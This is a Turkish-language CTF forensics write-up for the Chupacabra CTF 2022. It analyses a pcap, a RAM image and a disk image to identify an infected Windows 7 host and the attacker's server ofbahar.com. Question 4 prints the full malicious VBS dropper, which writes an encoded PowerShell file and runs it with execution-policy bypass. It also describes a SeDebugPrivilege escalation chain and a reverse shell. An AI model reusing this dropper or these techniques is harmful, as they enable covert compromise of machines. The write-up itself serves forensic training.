# 1. Soru

## Description
> What is the start and end date of the pcap file?

## Solution

"chupacabra_CTF_2022.pcap" dosyasını, WireShark üzerinde açıp "İstatistikler" menüsünden "Yakalama Dosyası Özellikleri" seçeneğine tıklıyoruz.

![image](https://user-images.githubusercontent.com/88983987/220134037-ba15571c-2fcd-4f86-b920-3830d1b4c209.png)
```
Süre

İlk paket:
2022-03-23 18:36:20
Son paket:
2022-03-23 18:57:03
Geçen:
00:20:43
```

Start Date: 2022-03-23 18:36:20

End Date: 2022-03-23 18:57:03

# 2. Soru

## Description
> What is the sha256 of the pcap file? 

## Solution

Yakalama Dosyası Özellikleri menüsünde SHA256 değerine de ulaşmamız mümkün.

```
Karma (SHA256):
21f469ea0c9214a5ad2f577b24b68d2ea6276000b4afe46522f8ac5d3ea7d5d8
Karma (RIPEMD160):
c5fb668833d1706924680793eb71fb71becebffd
Karma (SHA1):
cbfda5051436b28f2722cb94ecda2e876e474db1
```

SHA256: 21f469ea0c9214a5ad2f577b24b68d2ea6276000b4afe46522f8ac5d3ea7d5d8

# 3. Soru

## Description
> What is the IP address, MAC address, host name and operating system of the infected host?

## Solution

IP Address: 

1. Çözüm: 

Malware'in bir şekilde ağ trafiği içerisinde karşı trafiğe iletildiğini biliyoruz. Bu yüzden "Export HTTP Objects" seçeneği ile iletilen dosyaları inceliyoruz.

![image](https://user-images.githubusercontent.com/88983987/220216469-67b8b61d-fc19-415f-b5d9-706a7b9476e3.png)

"ofbahar.com" tarafından iletilen "notamalware.vbs", "BodyMassIndex.exe" ve "accesstoken.exe" dosyaları şüphelidir. ofbahar.com domaininden alınan verileri çıkartmak için filtreleme yapıyoruz.
```
http.host==ofbahar.com
```

![image](https://user-images.githubusercontent.com/88983987/220217018-6a58e4de-33ce-440e-b3fc-b577c347d70c.png)

"192.168.43.26" IP adresinin, GET methodu ile "ofbahar.com" üzerindeki zararlıları indirdiği gözüküyor. Kurban makinemizin IP adresi "192.168.43.26".

2. Çözüm (Kesin Sonuç Değil):

Cihazda DHCP aktifleştirildiğini varsayarak, DHCP trafiğini inceleyebiliriz. Aksi takdirde bu yöntem başarısız olacaktır. Eğer statik ise ve network'e bağlandıktan sonra dump alındıysa, registry içerisinde IP adresimizi bulabiliriz. Fakat bu imaj için buna ihtiyaç yok.

"chupacabra_CTF_2022.E01" imajını FTK Imager yardımı ile mount ederek açıyoruz.

![image](https://user-images.githubusercontent.com/88983987/220218100-bd7ffbef-2483-4771-bbea-d3400897a5bb.png)

![image](https://user-images.githubusercontent.com/88983987/220218188-661f07c0-b6fa-45f1-8f34-ccd4c79b32f0.png)

![image](https://user-images.githubusercontent.com/88983987/220218512-7f919436-552f-44cc-a055-3c390eabb9b2.png)

```%SystemRoot%\System32\Winevt\Logs\``` adresine gidip, ```Microsoft-Windows-Dhcp-Client%4Admin.evtx``` dosyasını extract ediyoruz.

![image](https://user-images.githubusercontent.com/88983987/220218055-137d3f4d-e773-44a9-9af7-aa6a4ab04f96.png)

Windows makinelerde çift tıklayarak inceleme yapabiliriz. 

Linux için: https://github.com/omerbenamram/evtx

![image](https://user-images.githubusercontent.com/88983987/220221546-d8f8fe63-6969-4e5b-b77c-8a00a980609f.png)

En üstteki mesaj iletisinde, 0x0800279F7BD1 (08:00:27:9F:7B:D1) MAC adresli cihazın, 192.168.43.26 IP adresini DHCP sunucusundan istediği fakat reddedildiği gözüküyor. DHCPNACK iletisinin bir çok sebebi olabilir. Bu durumdan dolayı bu çözüm kesin değildir. Fakat MAC adresini elde etmiş olduk.

IP Address: 192.168.43.26

MAC Address: 08:00:27:9F:7B:D1

3. Çözüm: 

Bizle paylaşılan RAM imajındaki network iletişimlerini tarayarak IP adresine erişebiliriz. Bunun için "volatility" aracını kullanacağız.

İlk olarak imajımızın ne tür imaj olduğunu saptamamız gerekiyor. Bunun için "imageinfo" seçeneğini kullanacağız.
```
E:\ChupaCubra\Chupacabra\OnlineCTF-2022>volatility_2.6_win64_standalone.exe -f chupacabra_CTF_2022.raw imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (E:\ChupaCubra\Chupacabra\OnlineCTF-2022\chupacabra_CTF_2022.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800027f20a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff800027f3d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-03-23 15:56:26 UTC+0000
     Image local date and time : 2022-03-23 08:56:26 -0700
```

Önerilen ilk profil türü "Win7SP1x64". Bu profili kullanarak UDP ve TCP iletişimlerini listeleyen "netscan" seçeneğini kullanacağız.

```
E:\ChupaCubra\Chupacabra\OnlineCTF-2022>volatility_2.6_win64_standalone.exe -f chupacabra_CTF_2022.raw --profile=Win7SP1x64 netscan
Volatility Foundation Volatility Framework 2.6
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x7dc01900         UDPv4    10.0.2.15:137                  *:*                                   4        System         2022-03-23 13:28:12 UTC+0000
0x7dc01b80         UDPv4    10.0.2.15:138                  *:*                                   4        System         2022-03-23 13:28:12 UTC+0000
0x7dc02370         UDPv4    0.0.0.0:3702                   *:*                                   956      svchost.exe    2022-03-23 15:34:52 UTC+0000
0x7dc3b940         UDPv4    192.168.43.26:137              *:*                                   4        System         2022-03-23 15:34:45 UTC+0000
0x7dc44550         UDPv6    ::1:1900                       *:*                                   1292     svchost.exe    2022-03-23 15:34:45 UTC+0000
0x7dc57960         UDPv4    0.0.0.0:53868                  *:*                                   4032     chrome.exe     2022-03-23 15:53:36 UTC+0000
0x7dc57960         UDPv6    :::53868                       *:*                                   4032     chrome.exe     2022-03-23 15:53:36 UTC+0000
0x7dc70d70         UDPv4    0.0.0.0:3702                   *:*                                   1292     svchost.exe    2022-03-23 15:34:50 UTC+0000
0x7dc70d70         UDPv6    :::3702                        *:*                                   1292     svchost.exe    2022-03-23 15:34:50 UTC+0000
0x7dcd6310         UDPv4    127.0.0.1:65117                *:*                                   1292     svchost.exe    2022-03-23 15:34:48 UTC+0000
0x7dcd6ab0         UDPv4    0.0.0.0:3702                   *:*                                   1292     svchost.exe    2022-03-23 15:34:50 UTC+0000
0x7dd1dcb0         UDPv4    0.0.0.0:0                      *:*                                   960      svchost.exe    2022-03-23 15:53:09 UTC+0000
0x7dd1dcb0         UDPv6    :::0                           *:*                                   960      svchost.exe    2022-03-23 15:53:09 UTC+0000
0x7dd2c010         UDPv4    0.0.0.0:3702                   *:*                                   956      svchost.exe    2022-03-23 15:34:52 UTC+0000
0x7dd486c0         UDPv4    0.0.0.0:3540                   *:*                                   2300     svchost.exe    2022-03-23 13:28:45 UTC+0000
0x7dd486c0         UDPv6    :::3540                        *:*                                   2300     svchost.exe    2022-03-23 13:28:45 UTC+0000
0x7dd61ba0         UDPv4    0.0.0.0:5004                   *:*                                   2900     wmpnetwk.exe   2022-03-23 13:28:35 UTC+0000
0x7dd61ba0         UDPv6    :::5004                        *:*                                   2900     wmpnetwk.exe   2022-03-23 13:28:35 UTC+0000
0x7dd62880         UDPv4    0.0.0.0:5004                   *:*                                   2900     wmpnetwk.exe   2022-03-23 13:28:35 UTC+0000
0x7dd63ec0         UDPv4    0.0.0.0:5005                   *:*                                   2900     wmpnetwk.exe   2022-03-23 13:28:35 UTC+0000
0x7dd65ec0         UDPv4    0.0.0.0:5005                   *:*                                   2900     wmpnetwk.exe   2022-03-23 13:28:35 UTC+0000
0x7dd65ec0         UDPv6    :::5005                        *:*                                   2900     wmpnetwk.exe   2022-03-23 13:28:35 UTC+0000
0x7dd8ddc0         UDPv4    0.0.0.0:3702                   *:*                                   1292     svchost.exe    2022-03-23 15:34:50 UTC+0000
0x7dd9b3e0         UDPv4    0.0.0.0:0                      *:*                                   2300     svchost.exe    2022-03-23 13:28:36 UTC+0000
0x7dd9b3e0         UDPv6    :::0                           *:*                                   2300     svchost.exe    2022-03-23 13:28:36 UTC+0000
0x7dda5d00         UDPv4    0.0.0.0:0                      *:*                                   2300     svchost.exe    2022-03-23 13:28:36 UTC+0000
0x7dda5d00         UDPv6    :::0                           *:*                                   2300     svchost.exe    2022-03-23 13:28:36 UTC+0000
0x7de719b0         UDPv4    0.0.0.0:53109                  *:*                                   1292     svchost.exe    2022-03-23 13:28:08 UTC+0000
0x7de719b0         UDPv6    :::53109                       *:*                                   1292     svchost.exe    2022-03-23 13:28:08 UTC+0000
0x7de72260         UDPv4    0.0.0.0:53108                  *:*                                   1292     svchost.exe    2022-03-23 13:28:08 UTC+0000
0x7de7aec0         UDPv4    0.0.0.0:5353                   *:*                                   2356     chrome.exe     2022-03-23 15:36:30 UTC+0000
0x7deb6c60         UDPv4    0.0.0.0:64821                  *:*                                   956      svchost.exe    2022-03-23 15:34:52 UTC+0000
0x7dfdfc70         UDPv6    fe80::a9cb:981d:94dd:191e:65114 *:*                                   1292     svchost.exe    2022-03-23 15:34:48 UTC+0000
0x7dffb660         UDPv4    0.0.0.0:5353                   *:*                                   4032     chrome.exe     2022-03-23 15:36:44 UTC+0000
0x7dffb660         UDPv6    :::5353                        *:*                                   4032     chrome.exe     2022-03-23 15:36:44 UTC+0000
0x7e131cb0         UDPv4    0.0.0.0:0                      *:*                                   2300     svchost.exe    2022-03-23 13:28:45 UTC+0000
0x7e131cb0         UDPv6    :::0                           *:*                                   2300     svchost.exe    2022-03-23 13:28:45 UTC+0000
0x7e1e82c0         UDPv4    0.0.0.0:0                      *:*                                   680      VBoxService.ex 2022-03-23 15:53:45 UTC+0000
0x7e3bfec0         UDPv6    ::1:65115                      *:*                                   1292     svchost.exe    2022-03-23 15:34:48 UTC+0000
0x7dac2370         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        508      lsass.exe
0x7dac2370         TCPv6    :::49156                       :::0                 LISTENING        508      lsass.exe
0x7dc01580         TCPv4    10.0.2.15:139                  0.0.0.0:0            LISTENING        4        System
0x7dc5d410         TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        508      lsass.exe
0x7dd70960         TCPv4    0.0.0.0:10243                  0.0.0.0:0            LISTENING        4        System
0x7dd70960         TCPv6    :::10243                       :::0                 LISTENING        4        System
0x7dd72590         TCPv4    0.0.0.0:554                    0.0.0.0:0            LISTENING        2900     wmpnetwk.exe
0x7dd74cf0         TCPv4    0.0.0.0:554                    0.0.0.0:0            LISTENING        2900     wmpnetwk.exe
0x7dd74cf0         TCPv6    :::554                         :::0                 LISTENING        2900     wmpnetwk.exe
0x7ddc29c0         TCPv4    0.0.0.0:2869                   0.0.0.0:0            LISTENING        4        System
0x7ddc29c0         TCPv6    :::2869                        :::0                 LISTENING        4        System
0x7df70670         TCPv4    0.0.0.0:445                    0.0.0.0:0            LISTENING        4        System
0x7df70670         TCPv6    :::445                         :::0                 LISTENING        4        System
0x7df855a0         TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        492      services.exe
0x7df870e0         TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        492      services.exe
0x7df870e0         TCPv6    :::49155                       :::0                 LISTENING        492      services.exe
0x7dfb05f0         TCPv4    0.0.0.0:3587                   0.0.0.0:0            LISTENING        2300     svchost.exe
0x7dfb05f0         TCPv6    :::3587                        :::0                 LISTENING        2300     svchost.exe
0x7e0c7200         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        960      svchost.exe
0x7e13f010         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        756      svchost.exe
0x7e13fc90         TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        756      svchost.exe
0x7e13fc90         TCPv6    :::135                         :::0                 LISTENING        756      svchost.exe
0x7e149cb0         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        388      wininit.exe
0x7e149cb0         TCPv6    :::49152                       :::0                 LISTENING        388      wininit.exe
0x7e14f6a0         TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        388      wininit.exe
0x7e1b8220         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        800      svchost.exe
0x7e1b8220         TCPv6    :::49153                       :::0                 LISTENING        800      svchost.exe
0x7e1b8be0         TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        800      svchost.exe
0x7dc26cf0         TCPv4    192.168.43.26:49531            68.183.67.198:27     ESTABLISHED      568      BodyMassIndex.
0x7dcab850         TCPv6    -:0                            4810:8b01:80fa:ffff:4810:8b01:80fa:ffff:0 CLOSED           1072     svchost.exe
0x7dd3b410         TCPv6    -:0                            388b:7d03:80fa:ffff:388b:7d03:80fa:ffff:0 CLOSED           2900     wmpnetwk.exe
0x7ddcacf0         TCPv4    -:0                            56.139.125.3:0       CLOSED           4        System
0x7df56cf0         TCPv4    192.168.43.26:49472            213.180.204.179:443  ESTABLISHED      4032     chrome.exe
0x7e143820         TCPv6    -:0                            38cb:2903:80fa:ffff:38cb:2903:80fa:ffff:0 CLOSED           2        ►??☺????
0x7e268330         TCPv4    -:0                            56.203.41.3:0        CLOSED           2        ►??☺????
0x7e53bc20         UDPv4    192.168.43.26:56702            *:*                                   2356     chrome.exe     2022-03-23 15:56:23 UTC+0000
0x7e79d300         UDPv4    0.0.0.0:3702                   *:*                                   956      svchost.exe    2022-03-23 15:34:52 UTC+0000
0x7e79d300         UDPv6    :::3702                        *:*                                   956      svchost.exe    2022-03-23 15:34:52 UTC+0000
0x7e7e14c0         UDPv4    0.0.0.0:64822                  *:*                                   956      svchost.exe    2022-03-23 15:34:52 UTC+0000
0x7e7e14c0         UDPv6    :::64822                       *:*                                   956      svchost.exe    2022-03-23 15:34:52 UTC+0000
0x7e5e8c60         TCPv4    0.0.0.0:5357                   0.0.0.0:0            LISTENING        4        System
0x7e5e8c60         TCPv6    :::5357                        :::0                 LISTENING        4        System
0x7e7d8010         TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        960      svchost.exe
0x7e7d8010         TCPv6    :::49154                       :::0                 LISTENING        960      svchost.exe
0x7e5d04a0         TCPv6    -:0                            4810:8b01:80fa:ffff:4810:8b01:80fa:ffff:0 CLOSED           2        ►??☺????
0x7ee8d280         UDPv4    0.0.0.0:3702                   *:*                                   1292     svchost.exe    2022-03-23 15:34:50 UTC+0000
0x7ee8d280         UDPv6    :::3702                        *:*                                   1292     svchost.exe    2022-03-23 15:34:50 UTC+0000
0x7eec0ad0         UDPv4    0.0.0.0:5353                   *:*                                   4032     chrome.exe     2022-03-23 15:36:44 UTC+0000
0x7f264ec0         UDPv4    0.0.0.0:5355                   *:*                                   1072     svchost.exe    2022-03-23 15:34:48 UTC+0000
0x7f264ec0         UDPv6    :::5355                        *:*                                   1072     svchost.exe    2022-03-23 15:34:48 UTC+0000
0x7f2ae540         UDPv4    0.0.0.0:0                      *:*                                   1072     svchost.exe    2022-03-23 15:34:46 UTC+0000
0x7f2ae540         UDPv6    :::0                           *:*                                   1072     svchost.exe    2022-03-23 15:34:46 UTC+0000
0x7f3cf270         UDPv4    0.0.0.0:52415                  *:*                                   4032     chrome.exe     2022-03-23 15:56:12 UTC+0000
0x7f3cf970         UDPv6    fe80::a9cb:981d:94dd:191e:1900 *:*                                   1292     svchost.exe    2022-03-23 15:34:45 UTC+0000
0x7f70e590         UDPv6    fe80::a9cb:981d:94dd:191e:546  *:*                                   800      svchost.exe    2022-03-23 15:56:06 UTC+0000
0x7eff48c0         TCPv6    ::1:2869                       ::1:49545            CLOSED           4        System
0x7f552010         TCPv6    ::1:49545                      ::1:2869             CLOSED           2900     wmpnetwk.exe
0x7f678af0         TCPv4    192.168.43.26:49547            52.109.88.177:443    CLOSED           3252     EXCEL.EXE
0x7f6a04f0         TCPv4    192.168.43.26:49546            34.104.35.123:80     CLOSED           960      svchost.exe
0x7f831b10         UDPv4    0.0.0.0:5353                   *:*                                   2356     chrome.exe     2022-03-23 15:36:30 UTC+0000
0x7f831b10         UDPv6    :::5353                        *:*                                   2356     chrome.exe     2022-03-23 15:36:30 UTC+0000
0x7f8adec0         UDPv4    192.168.43.26:1900             *:*                                   1292     svchost.exe    2022-03-23 15:34:45 UTC+0000
0x7f9c0ec0         UDPv4    0.0.0.0:5355                   *:*                                   1072     svchost.exe    2022-03-23 15:34:48 UTC+0000
0x7fa19cb0         UDPv4    0.0.0.0:65468                  *:*                                   0                       2022-03-23 13:59:34 UTC+0000
0x7fb06920         UDPv4    0.0.0.0:3702                   *:*                                   956      svchost.exe    2022-03-23 15:34:52 UTC+0000
0x7fb06920         UDPv6    :::3702                        *:*                                   956      svchost.exe    2022-03-23 15:34:52 UTC+0000
0x7fc86ec0         UDPv4    192.168.43.26:138              *:*                                   4        System         2022-03-23 15:34:45 UTC+0000
0x7fcf5010         UDPv4    127.0.0.1:1900                 *:*                                   1292     svchost.exe    2022-03-23 15:34:45 UTC+0000
0x7fddea30         UDPv4    192.168.43.26:65116            *:*                                   1292     svchost.exe    2022-03-23 15:34:48 UTC+0000
0x7fa04d30         TCPv4    192.168.43.26:139              0.0.0.0:0            LISTENING        4        System
0x7f886010         TCPv4    -:49487                        -:443                CLOSED           4032     chrome.exe
```

Görüldüğü üzere Private IP olarak gözüken belirli bir IP adresi var. 

IP Address: 192.168.43.26

MAC Address:

1. Çözüm:

Cihazın MAC Adresini elde etmek için "chupacabra_CTF_2022.pcap" dosyasını WireShark ile açtıktan sonra, MAC Adreslerinin kontrol protokolü olan ARP sorgularını aratacağız. Bunun için arama çubuğuna "arp" yazıyoruz.

![image](https://user-images.githubusercontent.com/88983987/220222311-0203a871-6a2e-48ce-842e-818820ce4c4c.png)

MAC Address: 08:00:27:9F:7B:D1

2. Çözüm:

IP Adresini alırken elde ettiğimiz EVTX logunda MAC adresimize rastlamıştık. Bu şekilde cihazımızın donanım kimliğini alabiliriz. MAC Spoofing yapılmadığı sürece oradaki değer doğru kalacaktır.

FTK Imager ile ```%SystemRoot%\System32\Winevt\Logs\``` adresine gidip, ```Microsoft-Windows-Dhcp-Client%4Admin.evtx``` dosyasını extract ediyoruz.

![image](https://user-images.githubusercontent.com/88983987/220218055-137d3f4d-e773-44a9-9af7-aa6a4ab04f96.png)

Windows makinelerde çift tıklayarak inceleme yapabiliriz. 

Linux için: https://github.com/omerbenamram/evtx

![image](https://user-images.githubusercontent.com/88983987/220221546-d8f8fe63-6969-4e5b-b77c-8a00a980609f.png)

En üstteki mesaj iletisinde, 0x0800279F7BD1 (08:00:27:9F:7B:D1) MAC adresli cihazın, 192.168.43.26 IP adresini DHCP sunucusundan istediği fakat reddedildiği gözüküyor. Fakat MAC adresini elde etmiş olduk.

MAC Address: 08:00:27:9F:7B:D1

Operating System:

1. Çözüm:

Volatility ile ram imajının türünü belirleyebiliriz. Bunun için "imageinfo" komutunu çalıştırmamız yetecektir.


```
E:\ChupaCubra\Chupacabra\OnlineCTF-2022>volatility_2.6_win64_standalone.exe -f chupacabra_CTF_2022.raw imageinfo
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (E:\ChupaCubra\Chupacabra\OnlineCTF-2022\chupacabra_CTF_2022.raw)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800027f20a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff800027f3d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-03-23 15:56:26 UTC+0000
     Image local date and time : 2022-03-23 08:56:26 -0700
```

İlk önerilen profil "Win7SP1x64". Emin olmak için bu profil türü ile rastgele bir komut çalıştırmayı deneyebilirsiniz. Örneğin:

```
E:\ChupaCubra\Chupacabra\OnlineCTF-2022>volatility_2.6_win64_standalone.exe -f chupacabra_CTF_2022.raw --profile=Win7SP1x64 pstree
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa8002acfb30:explorer.exe                     1680   1408     30   1061 2022-03-23 13:28:28 UTC+0000
. 0xfffffa8002999b30:DumpIt.exe                      2788   1680      2     45 2022-03-23 15:56:24 UTC+0000
. 0xfffffa8003699060:VBoxTray.exe                    1972   1680     14    146 2022-03-23 13:28:28 UTC+0000
. 0xfffffa80020c06c0:chrome.exe                      2356   1680     30    912 2022-03-23 15:36:22 UTC+0000
.. 0xfffffa8001a54060:chrome.exe                     1920   2356     11    187 2022-03-23 15:37:11 UTC+0000
.. 0xfffffa8001c10600:EXCEL.EXE                      3252   2356     17    741 2022-03-23 15:37:26 UTC+0000
... 0xfffffa8001e32520:splwow64.exe                  3536   3252      6     64 2022-03-23 15:37:33 UTC+0000
.. 0xfffffa800252eb30:chrome.exe                     4032   2356     14    220 2022-03-23 15:36:22 UTC+0000
.. 0xfffffa8001afc060:chrome.exe                     27...
```

Komut başarılı oldu, bu durumda seçtiğimiz profil doğru ve işletim sistemimiz Windows 7 SP1 X64.

Operating System: Win7SP1x64

2. Çözüm:

Bu çözümün daha kesin sonuç vereceğini söyleyebilirim. 

İşletim sistemizin türünü registry kayıtlarından okuyacağız. Bu işlem için, FTK Imager ile ```C:/Windows/System32/config/SOFTWARE``` dosyasını export etmemiz gerekiyor.

![image](https://user-images.githubusercontent.com/88983987/220223200-df8510ab-c07a-487c-8eb2-26e88bd97a08.png)

Ardından Registry Explorer (https://www.sans.org/tools/registry-explorer/) yardımı ile dosyamızı açıyoruz.

![image](https://user-images.githubusercontent.com/88983987/220223367-c4395651-ebb8-4854-904e-921bcea18a5f.png)

Ardından aşağıdaki yolu takip ediyoruz.

```CMI-CreateHive{199DAFC2-6F16-4946-BF90-5A3FC3A60902}\Microsoft\Windows NT\CurrentVersion```

Bu key bizim işletim sistemimize dair bilgilerimizi tutar.

![image](https://user-images.githubusercontent.com/88983987/220223582-112856d7-f01b-4a7e-ab56-c113e7e75e75.png)

İşletim sistemimizin build numarasının "7601" olduğunu ve işletim sistemi türümüzün "Windows 7 Professional" olduğunu, ayrıca 64 bit mimariye sahip (BuildLabEx-amd64) olduğunu görüyoruz.

Operating System: Windows 7 Professional SP1 7601 64 Bit

Hostname:

Bu bilgiyi edinmek için FTK Imager ile ```C:/Windows/System32/config/SYSTEM``` dosyasını export etmemiz gerekiyor.

Ardından Registry Explorer (https://www.sans.org/tools/registry-explorer/) yardımı ile dosyamızı açıyoruz.

Ardından aşağıdaki yolu takip ediyoruz.

```CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\ControlSet001\Control\ComputerName\ComputerName```

![image](https://user-images.githubusercontent.com/88983987/220224176-69994098-d170-425b-b68e-906b7d6cbd0a.png)

Hostname: RICKMARTIN

3. Sorunun Cevabı: 
```
IP Address: 192.168.43.26
MAC Address: 08:00:27:9F:7B:D1
Operating System: Windows 7 Professional SP1 7601 64 Bit
Hostname: RICKMARTIN
```

# 4. Soru

## Description
> From which IP address and port is the malware infected?

## Solution

Bu soruda malware'yi bulaştıran IP Adresini mi, yoksa virüsün hangi adresler ile bağlantı kurduğunu mu sorduğuna emin olamadım. Bu yüzden ikisini de çözeceğim.

1. Malware hangi IP Adresi ve Port üzerinden bulaşmıştır?

Wireshark ile daha önce "ofbahar.com" adresi üzerinden GET methodu ile verinin alındığını tespit etmiştik. İlk alınan zararlının paket detaylarını inceleyeceğiz.

Zaman akışına göre ilk alınan zararlı dosya "notamalware.vbs"

![image](https://user-images.githubusercontent.com/88983987/220225219-a46a2b22-5b70-4121-87b0-5a659e12da4f.png)

Veriyi "GET" ile isteyen kurban makinamız olduğu için, Dst adresleri dikkate alınacak.

![image](https://user-images.githubusercontent.com/88983987/220225496-5929dff0-b5e0-40f0-88e0-705a1e372415.png)

IP: 68.138.67.198
Port: 80

2. Malware hangi adresler üzerinden iletişim kuruyor?

İlk önce "notamalware.vbs" dosyası ile başlamak istiyorum. Dosyayı bir editör yardımı ile açtığımda içeriği aşağıdaki gibi karşılıyor beni.
```
Dim filesys, filetxt, getname, path
    Set filesys = CreateObject("Scripting.FileSystemObject")
    Set filetxt = filesys.CreateTextFile("C:\Users\RickMartinGrimes\AppData\Local\Temp\notabadpowershell.ps1", True)
    filetxt.WriteLine ("powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAEMAOgBcAFUAcwBlAHIAcwBcAFIAaQBjAGsATQBhAHIAdABpAG4ARwByAGkAbQBlAHMAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAEEAYwBjAGUAcwBzAFQAbwBrAGUAbgAuAGUAeABlAA==")
    Set oshell = CreateObject("WScript.Shell")
	filetxt.Close
    oshell.Run "powershell -exec bypass C:\Users\RickMartinGrimes\AppData\Local\Temp\notabadpowershell.ps1", 0, True D
```

Base64 ile bir kodlama yapıldığını görüyorum. CyberChef ile decode ediyorum. AV Bypass için yapılan Null Byte'lardan kurtulmak gerekebiliyor.

![image](https://user-images.githubusercontent.com/88983987/220226850-10caec56-fbe2-423a-a34d-356ab95f564c.png)

Bu dosya, çalıştırıldığında ```"C:\Users\RickMartinGrimes\AppData\Local\Temp\"``` konumunda, ```notabadpowershell.ps1``` adında bir dosya oluşturuyor. Ardından içerisine base64 ile kodlanmış metini yerleştiriyor ve dosyayı çalıştırıyor. 
```
Decoded:
Start-Process C:\Users\RickMartinGrimes\AppData\Local\Temp\AccessToken.exe
```
Bu bir dropper değil ve bir iletişim kurmuyor, sadece virüsün tetiklenmesini sağlıyor. 

Bu dosyanın çalıştırıp çalıştırılmadığını, Temp klasörü altında "notabadpowershell.ps1" adlı bir dosyanın olup olmamasından anlayabiliriz. FTK Imager ile hızlıca kontrol ediyoruz. Kontrol için ```C:\Users\RickMartinGrimes\AppData\Local\Temp\``` klasörüne gidiyoruz. 

![image](https://user-images.githubusercontent.com/88983987/220228062-a86bad7a-8037-4aa6-b109-520cd70e5bf4.png)

Dosya çalıştırılmış. Not edip, devam ediyoruz.

"accesstoken.exe" adlı dosyayı IDA üzerinde incelemeye alıyorum.

![image](https://user-images.githubusercontent.com/88983987/220233402-ea8ed342-a567-4ffa-9e3d-46b7bc81ce32.png)

Burda açıklanması gereken bir kaç nokta var. Program ilk çalıştığında atamalarını yaptıktan sonra, ```sub_4011C0``` alt programını çağırıyor. Bu alt program, kullanıcı adı verisini döndürüp ```eax```'ın bulunduğu memory alanına yazıyor. Ardından eax'ın bulunduğu memory alanındaki veriler okunup:
```
push eax
push    offset Format   ; "Su anki kullanici: %s\n"
```
komutları ile biçimlendirilerek ekrana yazdırılıyor. Yani eğer bu programın çalıştığı bilgisayardaki kullanıcının adı User ise, çıktı şu şekilde olmalı:
```
 "Su anki kullanici: User"
```
Ardından kullanıcımızın privilege (yetki) değerini ölçen bir kod bloğu var.

![image](https://user-images.githubusercontent.com/88983987/220234161-181f5521-4674-4333-ba27-aacf50ff1405.png)

CreateToolhelp32Snapshot fonksiyonu ile geçici bir snapshot oluşturuluyor, ardından Process32FirstW fonksiyonu ile process listteki ilk işlemi seçiyor. Ardından bunları bir yapıya yerleştiriyor.

![image](https://user-images.githubusercontent.com/88983987/220234533-afeec50b-0cce-4c0b-8536-507700606226.png)

Daha sonra, elde ettiği veriler ile "SeDebugPrivilege" yetkisini elde etmeye çalışarak, işlemin kendi yetkisini yükseltmeye çalışıyor.

![image](https://user-images.githubusercontent.com/88983987/220235955-1fd03e19-0aff-41d1-b2ea-d2862a41ad6b.png)

Tüm bu işlemlerin sonunda asıl zararlımız olan "BodyMassIndex.exe" dosyasını çalıştırıyor. İşlem daha yüksek yetkili bir işlem tarafından çağırıldığı için daha çok yetkiye sahip oluyor. 

![image](https://user-images.githubusercontent.com/88983987/220236205-4c5a885b-0233-470f-8fda-d92fd24ee116.png)

Sonuç olarak "accesstoken.exe" dosyası, privilege escalation (yetki yükseltme) için kullanılıyor, herhangi bir iletişim kurmuyor.

BodyMassIndex.exe dosyasını incelemeye başlıyorum. Klasik bir shell dosyası. Reverse shell'in bu dosya ile alındığını zaten tahmin ettiğimizden dolayı fonksiyonları çıkarmakta çok zorlanmıyoruz :) 

![image](https://user-images.githubusercontent.com/88983987/220236866-bd4c030f-032a-4da9-87a3-d8efa194695a.png)

İletişim yaptığı IP adresi ve Port bir sonraki kod bloğunda bulunuyor.

![image](https://user-images.githubusercontent.com/88983987/220236938-02bfb45c-c8d0-4774-9c57-6fccdfcae08e.png)

Cevap:
```
IP Address: 68.183.67.198 
Port: 27
```

# 5. Soru

## Description
> What is the domain name of the attacker's server?

## Solution

Bu soruda gidilebilecek birkaç yol var. En basit olanı WireShark üzerinde HTTP ile aldığımız zararlıların ```ofbahar.com``` adresinden geldiğini ve bu adresin ```68.183.67.198``` olduğunu daha önceden bulmuştuk. Bu durumda cevap: ```ofbahar.com``` oluyor. 

Fakat eğer bu bilgiye sahip olmasaydık, nasıl yapabilirdik?

Reverse IP Lookup Araçları kullanabilirdik. Offline olarak kullanılabilecek Linux araçları (örn: dig, nslookup) ve online olarak kullanılabilecek sorgulama araçları var. Fakat online araçlara veri sunmanın ne kadar doğru olduğuna emin değilim. Gerçek bir veri sızıntısı durumunda gizliliği korumak önemlidir.

